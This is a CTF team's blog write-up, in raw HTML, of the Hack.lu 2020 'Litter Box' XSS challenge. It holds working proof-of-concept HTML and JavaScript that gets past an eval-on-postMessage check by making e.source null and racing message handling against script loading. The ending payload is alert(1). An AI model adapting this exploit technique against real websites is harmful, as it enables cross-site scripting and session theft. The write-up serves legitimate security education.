<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <!-- title will be injected from _config.yml -->
  <!-- Stylesheets -->
  
  <link rel="stylesheet" href="/assets/css/bootstrap.css">
  <link rel="stylesheet" href="/assets/css/style.css">
  <link rel="stylesheet" href="/assets/css/responsive.css">
  <link rel="stylesheet" href="/assets/css/import_custom.css">

  <link rel="shortcut icon" href="images/favicon.png" type="image/x-icon">
  <link rel="icon" href="images/favicon.png" type="image/x-icon">

  <!-- Responsive -->
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
  <!--[if lt IE 9]><script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.js"></script><![endif]-->
  <!--[if lt IE 9]><script src="js/respond.js"></script><![endif]--><!-- Begin Jekyll SEO tag v2.6.1 -->
<title>Litter Box | LetzPwn - Luxembourgish CTF Team</title>
<meta name="generator" content="Jekyll v4.0.0" />
<meta property="og:title" content="Litter Box" />
<meta name="author" content="Alain K." />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Description Do you like Cats? Do you like XSS? If you answered ‚ÄúYes‚Äù to one of these questions, this challenge is for you: https://litterbox.cf" />
<meta property="og:description" content="Description Do you like Cats? Do you like XSS? If you answered ‚ÄúYes‚Äù to one of these questions, this challenge is for you: https://litterbox.cf" />
<link rel="canonical" href="/writeup/2020/10/26/litterbox.html" />
<meta property="og:url" content="/writeup/2020/10/26/litterbox.html" />
<meta property="og:site_name" content="LetzPwn - Luxembourgish CTF Team" />
<meta property="og:image" content="/website.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2020-10-26T09:10:05+00:00" />
<script type="application/ld+json">
{"description":"Description Do you like Cats? Do you like XSS? If you answered ‚ÄúYes‚Äù to one of these questions, this challenge is for you: https://litterbox.cf","headline":"Litter Box","dateModified":"2020-10-26T09:10:05+00:00","datePublished":"2020-10-26T09:10:05+00:00","image":"/website.png","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"/writeup/2020/10/26/litterbox.html"},"url":"/writeup/2020/10/26/litterbox.html","author":{"@type":"Person","name":"Alain K."},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link type="application/atom+xml" rel="alternate" href="/feed.xml" title="LetzPwn - Luxembourgish CTF Team" /></head><body>
  <div class="page-wrapper"><!-- Main Header -->
<header class="main-header">
  <!-- Header Top -->
  <div class="header-top">
    <div class="auto-container clearfix">

      <div class="top-left clearfix">
        <ul class="info-list">
          <li>The first Luxembourgish CTF Team</li>
        </ul>
      </div>

      <div class="top-right">
        <ul class="social-icons">
          <li><a href="https://twitter.com/LetzPwn"><span class="fab fa-twitter"></span></a></li>
          <li><a href="https://discord.gg/Qjt5zUc"><span class="fab fa-discord"></span></a></li>
        </ul>
      </div>
    </div>
  </div>

  <!-- Header Upper -->
  <div class="header-upper">
    <div class="inner-container">
      <div class="auto-container clearfix">
        <!--Logo-->
        <div class="logo-outer">
          <div class="logo"><a href="/"><img src="/assets/images/logo.png" alt=""
                title="Gamon - Digital Gaming and Esports HTML Template" style="max-width: 260px;"></a></div>
        </div>

        <!--Nav Box-->
        <div class="nav-outer clearfix">
          <!--Mobile Navigation Toggler-->
          <div class="mobile-nav-toggler"><span class="icon flaticon-menu-1"></span></div>

          <!-- Main Menu -->
          <nav class="main-menu navbar-expand-md navbar-light">
            <div class="collapse navbar-collapse show clearfix" id="navbarSupportedContent">
              <ul class="navigation clearfix pull-left">
                
                
                <li class=""><a href="/">Home</a>
                </li>
                
                
                
                <li class=""><a href="/about_us.html">About Us</a>
                </li>
                
                
                
                <li class=""><a href="/events.html">News & CTFs</a>
                </li>
                
                
              </ul>

                <ul class="navigation clearfix pull-right">
                  
                    
                    <li class=""><a href="/writeups.html">Writeups</a> </li>
                    
                  
                    
                    <li class=""><a href="/contact.html">Contact</a> </li>
                    
                  
                </ul>
            </div>
          </nav>
          <!-- Main Menu End-->
        </div>
      </div>
    </div>
  </div>
  <!--End Header Upper-->

  <!-- Sticky Header  -->
  <div class="sticky-header">
    <div class="auto-container clearfix">
      <!--Logo-->
      <div class="logo pull-left">
        <a href="/" title=""><img src="/assets/images/logo.png" style="max-width:100px;" alt="" title=""></a>
      </div>
      <!--Right Col-->
      <div class="pull-right">
        <!-- Main Menu -->
        <nav class="main-menu clearfix">
          <!--Keep This Empty / Menu will come through Javascript-->
        </nav><!-- Main Menu End-->
      </div>
    </div>
  </div><!-- End Sticky Menu -->

  <!-- Mobile Menu  -->
  <div class="mobile-menu">
    <div class="menu-backdrop"></div>
    <div class="close-btn"><span class="icon flaticon-close"></span></div>

    <nav class="menu-box">
      <div class="nav-logo"><a href="/"><img src="/assets/images/logo.png" alt="" title=""></a></div>
      <div class="menu-outer">
        <!--Here Menu Will Come Automatically Via Javascript / Same Menu as in Header-->
      </div>
      <!--Social Links--
      <div class="social-links">
        <ul class="clearfix">
          <li><a href="#"><span class="fab fa-twitter"></span></a></li>
          <li><a href="#"><span class="fab fa-facebook-square"></span></a></li>
          <li><a href="#"><span class="fab fa-pinterest-p"></span></a></li>
          <li><a href="#"><span class="fab fa-instagram"></span></a></li>
          <li><a href="#"><span class="fab fa-youtube"></span></a></li>
        </ul>
      </div>-->
    </nav>
  </div><!-- End Mobile Menu -->
</header>
<!--Page Title-->
<div itemscope itemtype="http://schema.org/BlogPosting">
  <section class="page-banner" style="padding-bottom: 40px; background-image:url(/assets/images/background/1.png);">
    <div class="auto-container">
      <div class="inner-container clearfix">
        <ul class="bread-crumb clearfix">
          <li><a href="/index.html">Home</a></li> 
          <li><a href="/writeups.html">Writeups</a></li>
          <li><a href="#">Hack.lu 2020 CTF</a></li> <!-- TODO: correct href-->
          <li itemprop="name headline">Litter Box Writeup</li>
        </ul>
        <h1>Litter Box Writeup</h1><ul class="custom-author">
                <li>By <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span
                      class="p-author h-card" itemprop="name">Alain K.</span></span>
                </li>
              </ul>
              <br/><div class="custom-date">Oct 26, 2020</div>
        <ul class="tags">
          <li>Solves: 3/671 teams</li>
          <li>Source: <a href="https://litterbox.cf" target="_blank" rel="noopener noreferrer">https://litterbox.cf</a></li>
        </ul>
    </div>
  </section>
  <!--End Page Title-->

  <!--Sidebar Page Container-->
  <div class="sidebar-page-containe" style="padding-top: 40px; background-color:#202020">
    <div class="auto-container">
      <div class="row clearfix">

        <!--Content Side / Blog Detail-->
        <div class="content-side col-lg-8 col-md-12 col-sm-12">
          <div class="blog-detail">
            <div class="lower-content writeup-content awsm" style="padding-top: 0px;">
              <p> <h2 id="description">Description</h2>
<blockquote>
  <p>Do you like Cats? Do you like XSS? If you answered ‚ÄúYes‚Äù to one of these questions, this challenge is for you: https://litterbox.cf</p>
</blockquote>

<blockquote>
  <p>Proof you have XSS by stealing the cookie (sameSite:None and secure) from the admin. You can use the bot from ‚ÄúSecret Image Sharing‚Äù. Send him your links here: https://submit.onlysecrets.flu.xxx</p>
</blockquote>

<h1 id="the-challenge">The challenge</h1>
<p>First of all, I want to give a huge shoutout to <a href="https://twitter.com/fluxfingers">@fluxfingers</a> for organizing this years hack.lu CTF. It was amazing: the beautiful theme, creative and no guessing challenges, and no technical problems.</p>

<h2 id="source-code">Source Code</h2>
<p>The challenge was purely a XSS challenge, so no server side trickeries. The source code was also very short:</p>
<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
    <span class="nt">&lt;body&gt;</span>
        <span class="nt">&lt;script&gt;</span>
            <span class="nb">window</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">source</span> <span class="o">==</span> <span class="nb">window</span><span class="p">.</span><span class="nx">frames</span><span class="p">[</span><span class="mi">0</span><span class="p">]){</span>
                        <span class="nb">eval</span><span class="p">(</span><span class="nx">e</span><span class="p">.</span><span class="nx">data</span><span class="p">)</span> <span class="c1">// üòΩ</span>
                <span class="p">}</span>
            <span class="p">}</span>
        <span class="nt">&lt;/script&gt;</span>

        <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">'main.js'</span><span class="nt">&gt;&lt;/script&gt;</span>
        <span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">'litterbox'</span> <span class="na">sandbox</span><span class="nt">&gt;&lt;/iframe&gt;</span>
    <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>The source code of main.js:</p>
<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="k">async</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">urlParams</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">)</span>
    <span class="kd">let</span> <span class="nx">src</span> <span class="o">=</span> <span class="nx">urlParams</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">src</span><span class="dl">'</span><span class="p">)</span> <span class="p">?</span> <span class="nx">urlParams</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">src</span><span class="dl">'</span><span class="p">)</span> <span class="p">:</span> <span class="dl">'</span><span class="s1">sandbox.html</span><span class="dl">'</span>
    <span class="c1">// make sure its up</span>
    <span class="k">try</span><span class="p">{</span>
        <span class="k">await</span> <span class="nx">fetch</span><span class="p">(</span><span class="nx">src</span><span class="p">,</span> <span class="p">{</span><span class="na">mode</span><span class="p">:</span> <span class="dl">'</span><span class="s1">no-cors</span><span class="dl">'</span><span class="p">,</span> <span class="na">cache</span><span class="p">:</span> <span class="dl">'</span><span class="s1">no-cache</span><span class="dl">'</span><span class="p">})</span>
    <span class="p">}</span>
    <span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span>
        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">'</span><span class="s1">noooo hecking</span><span class="dl">'</span><span class="p">)</span>
        <span class="k">return</span>
    <span class="p">}</span>
    <span class="nx">litterbox</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">src</span>   
<span class="p">})()</span>
</code></pre></div></div>
<p>The goal was to steal a cookie set by the bot we submit a URL to.
It‚Äôs pretty clear that we need to somehow pass the condition on line 5 in index.html to eval our own javascript to extract the cookie. So let‚Äôs get started!</p>

<h1 id="the-solution">The solution</h1>

<h2 id="baby-steps">Baby steps</h2>
<p>To reach the <code class="highlighter-rouge">eval</code> call, we first need to execute <code class="highlighter-rouge">onmessage</code>. This can be done by calling <code class="highlighter-rouge">postMessage</code> on the window. Let‚Äôs give it a try by embedding the site in an iframe of one of our own controlled websites and execute postMessage on it:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;html&gt;</span>
  <span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">"litterbox_website"</span><span class="nt">&gt;&lt;/iframe&gt;</span>

    <span class="nt">&lt;script&gt;</span>
      <span class="nx">litterbox_website</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https://litterbox.cf/</span><span class="dl">"</span>
      <span class="nx">litterbox_website</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="nx">litterbox_website</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nx">postMessage</span><span class="p">(</span><span class="dl">"</span><span class="s2">yolo</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">*</span><span class="dl">"</span><span class="p">)</span> <span class="c1">// --&gt; '*' is used to allow to post messages cross domain</span>
      <span class="p">}</span>
    <span class="nt">&lt;/script&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>Setting a breakpoint on <code class="highlighter-rouge">onmessage</code>, we can see that the event is triggered:</p>

<p><img src="img/breakpoint_onmessage.PNG" alt="bp" />
Ok, now to the intersting part. We need to somehow pass the condition <code class="highlighter-rouge">e.source == window.frames[0]</code>.</p>

<p>## Bypassing <code class="highlighter-rouge">e.source == window.frames[0]</code></p>

<p>Using the example code before, we can see in the debugger, that <code class="highlighter-rouge">e.source</code> is the window containing our (attacker‚Äôs) website (the one wehre <code class="highlighter-rouge">postMessage</code> was executed on).</p>

<p><code class="highlighter-rouge">window.frames[0]</code> is the window of the sandboxed iframe included at the end of the challenge website. At first sight, one might think that there are only 2 possibilities to make <code class="highlighter-rouge">e.source == window.frames[0]</code> evaluate to true:</p>
<h3 id="1-make-esource-reference-the-same-object-as-windowframes0">1. make <code class="highlighter-rouge">e.source</code> reference the same object as <code class="highlighter-rouge">window.frames[0]</code></h3>
<p>If we want to change <code class="highlighter-rouge">e.source</code> to be the same as <code class="highlighter-rouge">window.frames[0]</code>, we would need to execute the <code class="highlighter-rouge">postMessage</code>function from inside the sandboxed iframe. However, as the iframe is sandboxed, there is no way to execute javascript inside and therefore there is also no way to execute <code class="highlighter-rouge">postMessage</code> inside of it.</p>

<h3 id="2-make-windowframes0-reference-the-same-object-as-esource">2. make <code class="highlighter-rouge">window.frames[0]</code> reference the same object as <code class="highlighter-rouge">e.source</code></h3>
<p>For this, we would need the first embedded iframe on the litter box site to be the one that exectues <code class="highlighter-rouge">postMessage</code>. As there is no way to change the DOM on the website, it is impossible to add an own controlled iframe that is not sandboxed before the sandboxed iframe. What now?</p>

<h3 id="the-third-possibility-i-thought-there-were-only-2-possibilities">The third possibility: I thought there were only 2 possibilities</h3>
<p>What if we could change both <code class="highlighter-rouge">e.source</code> and <code class="highlighter-rouge">window.frames[0]</code>??
I knew of a way to make <code class="highlighter-rouge">e.source</code> equal to <code class="highlighter-rouge">null</code>.</p>

<h5 id="make-esource-be-null">Make <code class="highlighter-rouge">e.source</code> be <code class="highlighter-rouge">null</code></h5>
<p>One can force <code class="highlighter-rouge">e.source</code> to be <code class="highlighter-rouge">null</code> by destroying the window that executed the <code class="highlighter-rouge">postMessage</code> before the <code class="highlighter-rouge">onMessage</code>is received by the other window! Let‚Äôs give it a shot:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;html&gt;</span>
  <span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">"litterBoxWebsite"</span><span class="nt">&gt;&lt;/iframe&gt;</span>

    <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;script&gt;</span>
      <span class="kd">let</span> <span class="nx">postMessageWithNullSource</span> <span class="o">=</span> <span class="p">(</span><span class="nx">message</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nx">newWindow</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">)</span>
        <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">newWindow</span><span class="p">)</span>
        <span class="nx">newWindow</span><span class="p">.</span><span class="nx">contentWindow</span>
              <span class="p">.</span><span class="nb">eval</span><span class="p">(</span><span class="s2">`top.litterBoxWebsite.contentWindow.postMessage('</span><span class="p">${</span><span class="nx">message</span><span class="p">}</span><span class="s2">', '*')`</span><span class="p">)</span>
        <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">removeChild</span><span class="p">(</span><span class="nx">newWindow</span><span class="p">)</span> <span class="c1">// --&gt; remove the window that executed postMessage so that e.source will be null</span>
      <span class="p">}</span>

      <span class="nx">litterBoxWebsite</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https://litterbox.cf/</span><span class="dl">"</span>
      <span class="nx">litterBoxWebsite</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="nx">postMessageWithNullSource</span><span class="p">(</span><span class="dl">"</span><span class="s2">yolo</span><span class="dl">"</span><span class="p">)</span> <span class="c1">// --&gt; same as postMessage, but e.source will be null</span>
      <span class="p">}</span>
    <span class="nt">&lt;/script&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>Checking <code class="highlighter-rouge">e.source</code> on the breakpoint:</p>

<p><img src="img/breakpoint_src_null.PNG" alt="bp_source_null" /></p>

<p>Nice! We got the left-hand side of the condition to be <code class="highlighter-rouge">null</code>. Let‚Äôs check the equality table what the right side needs to be to make it pass:</p>

<p><img src="https://algassert.com/assets/2014-03-27-Better-JS-Equality-Table/grouped-table.png" alt="js_equality" />
(<a href="https://algassert.com/visualization/2014/03/27/Better-JS-Equality-Table.html">Image Source</a>)</p>

<p>So the right hand side of the condition (<code class="highlighter-rouge">window.frames[0]</code>) needs to be eiter <code class="highlighter-rouge">null</code> or <code class="highlighter-rouge">undefined</code>.</p>

<h5 id="make-windowframes0-be-undefined">Make <code class="highlighter-rouge">window.frames[0]</code> be <code class="highlighter-rouge">undefined</code></h5>
<p>The only way I could think of making <code class="highlighter-rouge">window.frames[0]</code> be <code class="highlighter-rouge">undefined</code> was by removing the sandboxed iframe from the DOM. But there was no way to modify the DOM.</p>

<p>That‚Äôs when I got the idea that maybe it was possible to trigger the <code class="highlighter-rouge">onmessage</code> event before the whole HTML Document was loaded.
If we managed to execute the <code class="highlighter-rouge">onmessage</code> event before the document loading reached the sandboxed iframe element, we would have <code class="highlighter-rouge">window.frames[0]</code> being <code class="highlighter-rouge">undefined</code>.</p>

<p>But is this possible? Is it possible that our postMessage will be handled by the Javscript Scheduler while the HTML Document is being parsed? The answer is no. HOWEVER: if there is a script element that is not async, the HTML Parsing is stopped and the Javascript Scheduler is waiting until the script is finished loading over the network.</p>

<p><img src="https://flaviocopes.com/javascript-async-defer/without-defer-async-head.png" alt="html_parsing" />
(<a href="https://flaviocopes.com/javascript-async-defer/">Image Source</a>)</p>

<p>During this time that the script is loading, the Javascript Scheduer is free to do other sutf: including processing received <code class="highlighter-rouge">postMessage</code> events that are not handled yet!</p>

<p>So let‚Äôs try to race condition postMessage/onmessage to execute while the <code class="highlighter-rouge">main.js</code> script is loading:</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
<span class="nt">&lt;html&gt;</span>
  <span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">"litterBoxWebsite"</span><span class="nt">&gt;&lt;/iframe&gt;</span>

    <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;script&gt;</span>

      <span class="kd">let</span> <span class="nx">postMessageWithNullSource</span> <span class="o">=</span> <span class="p">(</span><span class="nx">message</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="nx">newWindow</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">"</span><span class="s2">iframe</span><span class="dl">"</span><span class="p">)</span>
        <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">newWindow</span><span class="p">)</span>
        <span class="nx">newWindow</span><span class="p">.</span><span class="nx">contentWindow</span><span class="p">.</span><span class="nb">eval</span><span class="p">(</span><span class="s2">`top.litterBoxWebsite.contentWindow.postMessage("</span><span class="p">${</span><span class="nx">message</span><span class="p">}</span><span class="s2">", '*')`</span><span class="p">)</span>
        <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">removeChild</span><span class="p">(</span><span class="nx">newWindow</span><span class="p">)</span>
      <span class="p">}</span>

      <span class="kd">let</span> <span class="nx">stopTryRaceConditioning</span> <span class="o">=</span> <span class="kc">false</span>
      <span class="kd">let</span> <span class="nx">raceCondition</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="nx">postMessageWithNullSource</span><span class="p">(</span><span class="dl">"</span><span class="s2">alert(1)</span><span class="dl">"</span><span class="p">)</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">stopTryRaceConditioning</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// </span><span class="o">&lt;--</span> <span class="nx">repeat</span> <span class="nx">until</span> <span class="nx">iframe</span> <span class="nx">is</span> <span class="nx">fully</span> <span class="nx">loaded</span>
          <span class="nx">setTimeout</span><span class="p">(</span><span class="nx">raceCondition</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="c1">// </span><span class="o">&lt;--</span> <span class="nx">repeat</span> <span class="nx">after</span> <span class="nx">one</span> <span class="nx">ms</span><span class="p">,</span> <span class="kd">let</span> <span class="nx">scheduler</span> <span class="k">do</span> <span class="nx">other</span> <span class="nx">stuff</span> <span class="nx">during</span> <span class="nx">that</span> <span class="nx">time</span>
        <span class="p">}</span>
      <span class="p">}</span>

      <span class="nx">litterBoxWebsite</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">https://litterbox.cf/?src=data:,</span><span class="dl">"</span>
      <span class="nx">litterBoxWebsite</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span> 
        <span class="nx">stopTryRaceConditioning</span> <span class="o">=</span> <span class="kc">true</span>
      <span class="p">}</span>
      <span class="nx">raceCondition</span><span class="p">()</span>
    <span class="nt">&lt;/script&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<p>If we are a bit lucky, the scheduler has time to execute our postMessage request during the laoding of the <code class="highlighter-rouge">script.js</code>, which is before the sandboxed iframe is in the DOM. As a result <code class="highlighter-rouge">e.source == window.frames[0]</code> &lt;==&gt; <code class="highlighter-rouge">null == undefined</code> &lt;==&gt; <code class="highlighter-rouge">true</code></p>

<p>Using the chrome profiler, one can see that onmessage is called between the two parseHtml parts:</p>

<p><img src="img/profiler.PNG" alt="profiler" /></p>

<p>I guess I was pretty lucky that it worked first try. Sometimes, the Javascript scheduler is just not fast enough to process our postMessage request before the <code class="highlighter-rouge">script.js</code> has finished loading. In that case, one can simply repeat the whole process until successful.</p>
</p>
            </div>
          </div>

          <!-- Other Options -->
          <div class="post-share-options clearfix">
            <!--
            <div class="pull-left">
              <ul class="tags">
                <li><a href="#">Gaming</a></li>
                <li><a href="matches.html">Matches</a></li>
                <li><a href="#">Players</a></li>
              </ul>
            </div>
            -->
            <!--
            <div class="social-links pull-right">
              <ul class="social-links">
                <li><a href="#"><span class="fab fa-twitter"></span></a></li>
                <li><a href="#"><span class="fab fa-facebook-square"></span></a></li>
                <li><a href="#"><span class="fab fa-pinterest-p"></span></a></li>
                <li><a href="#"><span class="fab fa-instagram"></span></a></li>
              </ul>
            </div>
            -->
          </div>
        </div>

        <!--Sidebar Side-->
        <div class="sidebar-side col-lg-4 col-md-12 col-sm-12">
          <aside class="sidebar">

            <!-- Tags Widget -->
            <div class="sidebar-widget popular-tags">
              <div class="widget-content">
                <h4 class="sidebar-title">Task categories</h4>
                
                  <a href="#">web</a>
                
                  <a href="#">XSS</a>
                
              </div>
            </div>

            <!-- Search -->
            <!--
            <div class="sidebar-widget search-box">
              <form method="post" action="contact.html">
                <div class="form-group">
                  <input type="search" name="search-field" value="" placeholder="Search" required>
                  <button type="submit"><span class="icon fa fa-search"></span></button>
                </div>
              </form>
            </div>
            -->

            <!-- Post Widget -->
            <div class="sidebar-widget popular-posts">
              <div class="widget-content">
                <h4 class="sidebar-title">Recent Writeups</h4>
                
                
                
                
                
                
                
                
                
                <article class="post">
                  <div class="post-inner">
                    
                    
                    <figure class="post-thumb"><a href="/writeup/2019/10/27/Numtonce.html"><img src="/writeup/2019/10/27/website.png"
                          alt=""></a></figure>
                    <div class="post-info">Oct 26, 2020</div>
                    <div class="text"><a href="/writeup/2019/10/27/Numtonce.html">Numtonce</a></div>
                  </div>

                </article>
                
                
                
                <article class="post">
                  <div class="post-inner">
                    
                    
                    <figure class="post-thumb"><a href="/writeup/2020/02/05/Draw_with_us.html"><img src="/writeup/2020/02/05/website.png"
                          alt=""></a></figure>
                    <div class="post-info">Oct 26, 2020</div>
                    <div class="text"><a href="/writeup/2020/02/05/Draw_with_us.html">Draw with us</a></div>
                  </div>

                </article>
                
                
              </div>
            </div>

            <!-- Category Widget -->
            <!--
            <div class="sidebar-widget categories">
              <div class="widget-content">
                <h4 class="sidebar-title">Categories</h4>
                <ul class="blog-categories">
                  <li><a href="blog-single.html">Gaming</a></li>
                  <li><a href="blog-single.html">Matches</a></li>
                  <li><a href="blog-single.html">Video games</a></li>
                  <li><a href="blog-single.html">Esports</a></li>
                  <li><a href="blog-single.html">Champions</a></li>
                </ul>
              </div>
            </div>
            -->
          </aside>
        </div>
      </div>
    </div>
  </div>
</div>
<!-- End Sidebar Page Container -->

	<!-- Main Footer -->
  <footer class="main-footer">
    	<div class="auto-container">
        	<!--Widgets Section-->
            <div class="widgets-section">
            	<div class="row clearfix">
                	
                    <!--Column-->
                    <div class="column col-lg-4 col-md-6 col-sm-12">
						<div class="footer-widget logo-widget">
							<div class="logo">
                            	<a href="/index.html"><img src="/assets/images/logo.png" alt="" /></a>
                            </div>
							<div class="text"></div>
						</div>
					</div>
					
					<!--Column-->
                    <div class="column col-lg-4 col-md-6 col-sm-12">
						<div class="footer-widget links-widget">
							<div class="widget-content">
								<div class="footer-title">
									<h2>Links</h2>
								</div>
								<div class="row clearfix">
									<div class="column col-lg-6 col-md-6 col-sm-12">
										<ul class="list">
											<li><a href="/about_us.html">About</a></li>
											<li><a href="/members.html">Our Team</a></li>
											<li><a href="/events.html">News and CTFs</a></li>
											<li><a href="/contact.html">Contact</a></li>
										</ul>
									</div>
									<div class="column col-lg-6 col-md-6 col-sm-12">
										<ul class="list">
											<li><a href="/contact.html">Help & Support</a></li>
											<li><a href="/privacy_policy.html">Privacy Policy</a></li>
										</ul>
									</div>
								</div>
							</div>	
						</div>
					</div>
					
					<!--Column                    <div class="column col-lg-4 col-md-6 col-sm-12">
						<div class="footer-widget newsletter-widget">
							<div class="footer-title">
                            	<h2>Newsletter</h2>
                            </div>
							<div class="text">Subsrcibe us now to get the latest news and updates</div>
							<div class="newsletter-form">
                                <form method="post" action="contact.html">
                                    <div class="form-group clearfix">
                                        <input type="email" name="email" value="" placeholder="Email address" required>
                                        <button type="submit" class="theme-btn newsletter-btn"><span class="fas fa-envelope"></span></button>
                                    </div>
                                </form>
                            </div>
						</div>
					</div>
					-->

				</div>
			</div>
		</div>
		
		<!-- Footer Bottom -->
		<div class="footer-bottom">
			<div class="auto-container">
				<!--Scroll to top-->
				<div class="scroll-to-top scroll-to-target" data-target="html"><span class="flaticon-up-arrow"></span></div>
				<!--Scroll to top-->
				<div class="row clearfix">
					<!-- Column -->
					<div class="column col-lg-6 col-md-12 col-sm-12">
						<div class="copyright">&copy; Copyrights, 2019 All Rights Reserved</div>
					</div>
					<!-- Column -->
					<div class="column col-lg-6 col-md-12 col-sm-12">
						<ul class="social-icons">
							<li><a href="https://twitter.com/letzpwn"><span class="fab fa-twitter"></span></a></li>
						</ul>
					</div>
				</div>
			</div>
		</div>
		
  </footer>
  
</div>
<script src="/assets/js/jquery.js"></script>
<script src="/assets/js/popper.min.js"></script>
<script src="/assets/js/bootstrap.min.js"></script>
<script src="/assets/js/jquery-ui.js"></script>
<script src="/assets/js/jquery.fancybox.js"></script>
<script src="/assets/js/owl.js"></script>
<script src="/assets/js/appear.js"></script>
<script src="/assets/js/wow.js"></script>
<script src="/assets/js/scrollbar.js"></script>
<script src="/assets/js/script.js"></script></body>

</html>